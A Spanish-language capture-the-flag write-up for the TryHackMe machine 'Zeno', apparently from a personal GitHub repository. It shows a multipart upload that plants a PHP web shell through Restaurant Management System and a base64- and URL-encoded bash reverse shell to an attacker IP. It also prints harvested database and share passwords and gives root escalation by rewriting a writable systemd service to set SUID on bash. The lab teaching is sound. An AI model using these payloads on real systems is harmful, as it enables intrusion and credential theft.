# Zeno

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/a9c92bf3-29f3-4a4f-a54e-f30725ac4882)

***
 Source: https://tryhackme.com/room/thegreatescape
- OS: Linux
- Dificultad: Medium
- IP: No estática
- Temas: `RCE`, `CVE`, `Linux Enumeration`, `bin PrivEsc`.
***

- Realizamos un escaneo de puertos con nmap:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Zeno]
└─$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV 10.10.31.181
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-09 17:27 EST
NSE: Loaded 46 scripts for scanning.
Initiating SYN Stealth Scan at 17:27
Scanning 10.10.31.181 [65535 ports]
Discovered open port 22/tcp on 10.10.31.181
Discovered open port 12340/tcp on 10.10.31.181
Increasing send delay for 10.10.31.181 from 0 to 5 due to 11 out of 25 dropped probes since last increase.
Completed SYN Stealth Scan at 17:28, 26.75s elapsed (65535 total ports)
Initiating Service scan at 17:28
Scanning 2 services on 10.10.31.181
Completed Service scan at 17:28, 5.01s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.31.181.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 17:28
Completed NSE at 17:28, 1.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 17:28
Completed NSE at 17:28, 0.00s elapsed
Nmap scan report for 10.10.31.181
Host is up, received user-set (0.25s latency).
Scanned at 2024-02-09 17:27:43 EST for 33s
Not shown: 65519 filtered tcp ports (no-response), 14 filtered tcp ports (host-prohibited)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  tcpwrapped syn-ack ttl 61
12340/tcp open  tcpwrapped syn-ack ttl 61

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.07 seconds
           Raw packets sent: 131071 (5.767MB) | Rcvd: 16 (1.096KB)
~~~

- Inspeccioné la página lo más que pude, pero no encontré nada más que un `XSS` en el registro de sesión.
- Creé un usuario con nombre `<script>alert("xss")</script>` y credenciales `test@test.com:12345`:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/86bb1f76-fdc1-4568-b02c-74947331f9b4)

- Pero bueno, la página usa un CMS llamado `Restaurant Management System`, investigué sobre `rms exploit` y encontré algo interesante.
- Es una [RCE](https://www.exploit-db.com/exploits/47520) que se aprovecha de solicitudes POST para subir un archivo remoto a una dirección en especifico y ejecutar un comando a través de este mismo, derivando de una `RFI` a `RCE`.
- Podemos replicarlo con burpsuite o bien, hacer uso del exploit.
- La solicitud quedaría algo así:

~~~http
POST /rms/admin/foods-exec.php HTTP/1.1

Host: 10.10.55.120:12340

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Length: 336

Content-Type: multipart/form-data; boundary=---------------------------191691572411478

Connection: close

Referer: http://localhost:8081/rms/admin/foods.php

Cookie: PHPSESSID=4cvgeeheft3chvrnv81vusk3g3

Upgrade-Insecure-Requests: 1



-----------------------------191691572411478

Content-Disposition: form-data; name="photo"; filename="rev-shell.php"

Content-Type: text/html



<?php echo shell_exec($_GET["cmd"]); ?>

-----------------------------191691572411478

Content-Disposition: form-data; name="Submit"



Add

-----------------------------191691572411478--
~~~

- Ahora bien, si visitamos la url `http://10.10.55.120:12340/rms/images/rev-shell.php?cmd=id` debería arrojarnos la id del usuario.

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/f871ee41-b38d-4ffb-b755-1852a73bd80b)

- Solo debemos cambiar el comando a un payload encodeado para evitar conflicto con caracteres especiales:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Zeno]
└─$ echo -ne 'bash -c "bash -i >& /dev/tcp/10.2.60.167/4444 0>&1"' | base64                           
YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yLjYwLjE2Ny80NDQ0IDA+JjEi
~~~

- Y nuestro payload quedaría así:

~~~bash
echo -ne "YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yLjYwLjE2Ny80NDQ0IDA+JjEi" | base64 -d | bash
~~~

- Si la conexión no se realiza, siempre podemos encodeara el payload en URL:

~~~URL
%65%63%68%6f%20%2d%6e%65%20%22%59%6d%46%7a%61%43%41%74%59%79%41%69%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%79%4c%6a%59%77%4c%6a%45%32%4e%79%38%30%4e%44%51%30%49%44%41%2b%4a%6a%45%69%22%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68
~~~

- Nos ponemos en escucha y deberíamos ganar una conexión a la máquina:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Zeno]
└─$ nc -lvnp 4444                                                   
listening on [any] 4444 ...
connect to [10.2.60.167] from (UNKNOWN) [10.10.55.120] 41182
bash: no job control in this shell
bash-4.2$ whoami
whoami
apache
~~~

- Ahora hacemos un tratamiento de la TTY y podemos proseguir con la escalada de privilegios:

~~~bash
script /dev/null -c bash
^Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
~~~

***
<h3>PrivEsc. Apache --> User1:</h3>

- Enumeré dos usuarios para una posible escalada:

~~~bash
bash-4.2$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
edward:x:1000:1000::/home/edward:/bin/bash
~~~

- Al estar en un CMS, indagué un poco en los archivos de configuración.
- Encontré una contraseña para la base de datos de los usuarios en la ruta `/var/www/html/rms/connection/config.php`:

~~~php
<?php
    define('DB_HOST', 'localhost');
    define('DB_USER', 'root');
    define('DB_PASSWORD', 'veerUffIrangUfcubyig');
    define('DB_DATABASE', 'dbrms');
    define('APP_NAME', 'Pathfinder Hotel');
    error_reporting(1);
?>
~~~

- Las contraseñas aquí usaban un hash muy difícil de romper, así que lo dejé por el momento.
- Decidí usar ``linpeas``:

~~~bash
╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d                                        
You have write privileges over /etc/systemd/system/zeno-monitoring.service                                                        
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... /etc/fstab:#//10.10.10.10/secret-share        /mnt/secret-share       cifs_netdev,vers=3.0,ro,username=zeno,password=FrobjoodAdkoonceanJa,domain=localdomain,soft   0 0                                               
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No  
~~~

- Tenemos permiso para escribir en un archivo que poseé contraseñas hardcodeadas.
- Podemos acceder a través de ssh con estas mismas:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Zeno]
└─$ ssh edward@10.10.55.120
The authenticity of host '10.10.55.120 (10.10.55.120)' can't be established.
ED25519 key fingerprint is SHA256:rRttffFIyZasFZ3kH1UCuXbqoQKD5nKQWgtEudn7nys.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.55.120' (ED25519) to the list of known hosts.
edward@10.10.55.120's password: 
Last login: Tue Sep 21 22:37:30 2021
[edward@zeno ~]$ whoami
edward
~~~

***
<h3>PrivEsc. User1 --> Root:</h3>
- Lo primero que hice fue revisar que podíamos ejecutar como `sudo`:

~~~bash
[edward@zeno mnt]$ sudo -l
Matching Defaults entries for edward on zeno:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User edward may run the following commands on zeno:
    (ALL) NOPASSWD: /usr/sbin/reboot
~~~

- Para escalar privilegios desde el sistema de reinicio, podemos cargar un preload en algún archivo `.service`:
- Buscamos alguno donde tengamos escritura (Aunque linpeas ya nos lo mostró anteriormente):

~~~bash
[edward@zeno mnt]$ find / -writable -name "*.service" 2>/dev/null
/etc/systemd/system/multi-user.target.wants/zeno-monitoring.service
/etc/systemd/system/zeno-monitoring.service
~~~

- Sobrescribimos el archivo `/etc/systemd/system/zeno-monitoring.service`, pues el otro es solo un alias de este mismo:

~~~bash
# /etc/systemd/systm/example.service
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'chmod +xs /bin/bash'

[Install]
WantedBy=multi-user.target
~~~

- Ejecutamos el binario `reboot` como sudo:

~~~bash
[edward@zeno mnt]$ sudo /usr/sbin/reboot
Connection to 10.10.55.120 closed by remote host.
Connection to 10.10.55.120 closed.
~~~

- Y se nos cerrará la conexión.
- Tendremos que esperar alrededor de 3 minutos para volver a conectarnos por ssh.
- Si todo ha salido bien, tendremos una bash con permisos de SUID:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Zeno]
└─$ ssh edward@10.10.55.120
edward@10.10.55.120s password: 
Last login: Sat Feb 10 01:51:47 2024 from ip-10-2-60-167.eu-west-1.compute.internal
-bash-4.2$ ls -la /bin/bash
-rwsr-sr-x. 1 root root 964536 abr  1  2020 /bin/bash
-bash-4.2$ /bin/bash -p
bash-4.2# 
~~~

- Y con esto habríamos comprometido la máquina. Tiene un buen nivel de dificultad para repasar algunos conceptos de búsqueda y explotación básicos.
